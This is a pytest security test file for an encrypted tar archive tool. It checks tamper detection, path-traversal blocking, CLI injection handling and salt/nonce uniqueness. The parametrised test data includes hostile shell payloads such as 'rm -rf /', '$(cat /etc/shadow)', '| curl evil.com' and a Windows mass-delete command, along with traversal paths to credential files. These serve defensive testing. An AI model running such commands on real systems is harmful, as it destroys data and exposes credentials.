"""Security-focused tests — tamper detection, path traversal, injection, permissions."""

from __future__ import annotations

import argparse
import io
import os
import sys
import tarfile
from pathlib import Path

import pytest

from vault_tar.core import _read_header  # type: ignore
from vault_tar.core import (build_parser, decompress_archive, decrypt_file,
                            encrypt_file)

PASSWORD = "t3st-P@ssw0rd!#"


# ── Ciphertext tamper detection ──────────────────────────────────────────────

class TestTamperDetection:
    """AES-GCM must reject any bit-flip in header, ciphertext, or tag."""

    @pytest.fixture()
    def encrypted_blob(self, tmp_path: Path) -> tuple[Path, Path]:
        src = tmp_path / "secret.txt"
        src.write_text("Sensitive data " * 100)
        enc = tmp_path / "enc"
        encrypt_file(str(src), str(enc), PASSWORD, split_size=None)
        return enc, tmp_path / "dec"

    @pytest.mark.parametrize(
        "offset_from_end",
        [1, 16, 20, 50],
        ids=["last-byte", "in-tag", "near-tag", "in-ciphertext"],
    )
    def test_single_bit_flip_detected(
        self, encrypted_blob: tuple[Path, Path], offset_from_end: int
    ) -> None:
        enc, dec = encrypted_blob
        data = bytearray(enc.read_bytes())
        if offset_from_end >= len(data):
            pytest.skip("file too small for this offset")
        data[-offset_from_end] ^= 0x01
        enc.write_bytes(data)
        with pytest.raises(ValueError):
            decrypt_file(str(enc), str(dec), PASSWORD)

    def test_truncated_file_detected(self, encrypted_blob: tuple[Path, Path]) -> None:
        enc, dec = encrypted_blob
        data = enc.read_bytes()
        enc.write_bytes(data[: len(data) // 2])
        with pytest.raises((ValueError, Exception)):
            decrypt_file(str(enc), str(dec), PASSWORD)

    def test_appended_junk_detected(self, encrypted_blob: tuple[Path, Path]) -> None:
        """Extra bytes after valid chunks should not produce valid plaintext
        or should be caught as a format violation."""
        enc, dec = encrypted_blob
        with open(enc, "ab") as f:
            # Write a fake chunk header pointing to garbage
            f.write((1000).to_bytes(4, "big") + b"\x00" * 1000)
        with pytest.raises((ValueError, Exception)):
            decrypt_file(str(enc), str(dec), PASSWORD)

    def test_header_magic_tamper_rejected(
        self, encrypted_blob: tuple[Path, Path]
    ) -> None:
        enc, dec = encrypted_blob
        data = bytearray(enc.read_bytes())
        data[0] ^= 0xFF  # corrupt the magic byte
        enc.write_bytes(data)
        with pytest.raises(ValueError, match="magic"):
            decrypt_file(str(enc), str(dec), PASSWORD)

    def test_header_version_tamper_rejected(
        self, encrypted_blob: tuple[Path, Path]
    ) -> None:
        enc, dec = encrypted_blob
        data = bytearray(enc.read_bytes())
        data[2] = 99  # bogus version
        enc.write_bytes(data)
        with pytest.raises(ValueError, match="version"):
            decrypt_file(str(enc), str(dec), PASSWORD)


# ── Path traversal protection  ───────────────────────────────────────────────

class TestPathTraversal:
    """Tarfile extraction must block path-traversal members."""

    def _make_evil_tar(self, tar_path: str, member_name: str) -> None:
        """Create a tar with a single member whose name is *member_name*."""
        with tarfile.open(tar_path, "w:gz") as tar:
            info = tarfile.TarInfo(name=member_name)
            info.size = 5
            tar.addfile(info, io.BytesIO(b"EVIL\n"))

    @pytest.mark.parametrize(
        "evil_name",
        [
            "../../../etc/passwd",
            "..\\..\\Windows\\System32\\evil.dll",
            "normal/../../../escape",
        ],
        ids=["unix-traversal", "windows-traversal", "nested-traversal"],
    )
    def test_traversal_member_blocked(self, tmp_path: Path, evil_name: str) -> None:
        tar_path = str(tmp_path / "evil.tar.gz")
        out_dir = str(tmp_path / "extracted")
        self._make_evil_tar(tar_path, evil_name)

        # On Python ≥ 3.12, filter="data" raises; on <3.12, manual guard raises.
        with pytest.raises((ValueError, tarfile.FilterError, Exception)):
            decompress_archive(tar_path, out_dir)

    def test_absolute_path_member_neutralised(self, tmp_path: Path) -> None:
        """filter='data' strips leading '/' rather than raising — verify
        the file does NOT land at the absolute location."""
        tar_path = str(tmp_path / "abs.tar.gz")
        out_dir = str(tmp_path / "safe")
        evil_abs = "/tmp/absolute_escape"
        self._make_evil_tar(tar_path, evil_abs)
        decompress_archive(tar_path, out_dir)
        # Must NOT exist at the absolute path
        assert not os.path.exists(evil_abs)


# ── CLI injection resistance ─────────────────────────────────────────────────

class TestCLIInjection:
    """Malicious CLI arguments must not be executed as shell commands."""

    @pytest.fixture()
    def parser(self) -> argparse.ArgumentParser:
        return build_parser()

    @pytest.mark.parametrize(
        "payload",
        [
            "; rm -rf /",
            "$(cat /etc/shadow)",
            "| curl evil.com",
            "`whoami`",
            "&& del /f /s /q C:\\",
            "'; DROP TABLE users; --",
        ],
        ids=["semicolon", "subshell", "pipe", "backtick", "win-del", "sqli"],
    )
    def test_injection_in_password_is_literal(
        self, parser: argparse.ArgumentParser, payload: str
    ) -> None:
        """Passwords with shell metacharacters must be treated as literal strings."""
        args = parser.parse_args([
            "encrypt", "-i", "x", "-o", "y", "--password", payload,
        ])
        assert args.password == payload

    @pytest.mark.parametrize(
        "payload",
        [
            "../../../etc/shadow",
            "..\\..\\Windows\\System32\\config\\SAM",
            "/dev/null",
            "C:\\Windows\\System32\\cmd.exe",
        ],
        ids=["unix-path-traversal", "win-path-traversal", "dev-null", "win-sysfile"],
    )
    def test_traversal_paths_parsed_literally(
        self, parser: argparse.ArgumentParser, payload: str
    ) -> None:
        """Path arguments are strings — the parser must not interpret or sanitize them.
        Security enforcement happens in the business logic, not argparse."""
        args = parser.parse_args(
            ["encrypt", "-i", payload, "-o", "out", "--password", "pw"]
        )
        assert payload in args.input

    def test_injection_in_output_path_is_literal(
        self, parser: argparse.ArgumentParser
    ) -> None:
        args = parser.parse_args([
            "encrypt", "-i", "x", "-o", "; rm -rf /", "--password", "pw",
        ])
        assert args.output == "; rm -rf /"


# ── Encryption with adversarial inputs ───────────────────────────────────────

class TestAdversarialInputs:
    """Runtime behavior with edge-case inputs that reach business logic."""

    def test_encrypt_nonexistent_path_raises(self, tmp_path: Path) -> None:
        with pytest.raises(FileNotFoundError):
            encrypt_file(
                str(tmp_path / "../../nonexistent"),
                str(tmp_path / "out"),
                PASSWORD,
            )

    def test_encrypt_dir_as_file_only_raises(
        self, sample_tree: Path, tmp_path: Path
    ) -> None:
        """--file-only on a directory should fail because it expects os.path.isfile."""
        with pytest.raises(FileNotFoundError):
            encrypt_file(str(sample_tree), str(tmp_path / "out"), PASSWORD)

    def test_decrypt_random_bytes_raises(self, tmp_path: Path) -> None:
        junk = tmp_path / "random.bin"
        junk.write_bytes(os.urandom(1024))
        with pytest.raises(ValueError):
            decrypt_file(str(junk), str(tmp_path / "dec"), PASSWORD)

    def test_decrypt_empty_file_raises(self, tmp_path: Path) -> None:
        empty = tmp_path / "empty"
        empty.write_bytes(b"")
        with pytest.raises((ValueError, Exception)):
            decrypt_file(str(empty), str(tmp_path / "dec"), PASSWORD)

    @pytest.mark.skipif(sys.platform == "win32", reason="Unix permission model")
    def test_read_only_output_dir_raises(
        self, sample_tree: Path, tmp_path: Path
    ) -> None:
        """Writing to a read-only directory must raise, not silently fail."""
        enc = str(tmp_path / "enc")
        encrypt_file(
            str(sample_tree / "hello.txt"),
            enc,
            PASSWORD,
            split_size=None,
        )
        ro_dir = tmp_path / "readonly"
        ro_dir.mkdir()
        ro_dir.chmod(0o444)
        try:
            with pytest.raises((PermissionError, OSError)):
                decrypt_file(enc, str(ro_dir / "dec"), PASSWORD)
        finally:
            ro_dir.chmod(0o755)

    @pytest.mark.skipif(sys.platform == "win32", reason="Unix permission model")
    def test_unreadable_input_raises(self, tmp_path: Path) -> None:
        """Encrypting an unreadable file must raise PermissionError."""
        src = tmp_path / "secret.txt"
        src.write_text("data")
        src.chmod(0o000)
        try:
            with pytest.raises((PermissionError, OSError)):
                encrypt_file(str(src), str(tmp_path / "enc"), PASSWORD)
        finally:
            src.chmod(0o644)


# ── Nonce / key uniqueness across operations ─────────────────────────────────

class TestCryptoUniqueness:
    """Each encryption produces unique salt + nonce, so ciphertext differs."""

    def test_same_plaintext_produces_different_ciphertext(self, tmp_path: Path) -> None:
        src = tmp_path / "data.txt"
        src.write_text("identical")
        enc_a = tmp_path / "a.enc"
        enc_b = tmp_path / "b.enc"
        encrypt_file(str(src), str(enc_a), PASSWORD, split_size=None)
        encrypt_file(str(src), str(enc_b), PASSWORD, split_size=None)
        assert enc_a.read_bytes() != enc_b.read_bytes()

    def test_salt_differs_between_runs(self, tmp_path: Path) -> None:
        src = tmp_path / "data.txt"
        src.write_text("test")
        enc_a = tmp_path / "a.enc"
        enc_b = tmp_path / "b.enc"
        encrypt_file(str(src), str(enc_a), PASSWORD, split_size=None)
        encrypt_file(str(src), str(enc_b), PASSWORD, split_size=None)
        # Read salts from headers
        with open(enc_a, "rb") as f:
            salt_a, _ = _read_header(f)
        with open(enc_b, "rb") as f:
            salt_b, _ = _read_header(f)
        assert salt_a != salt_b
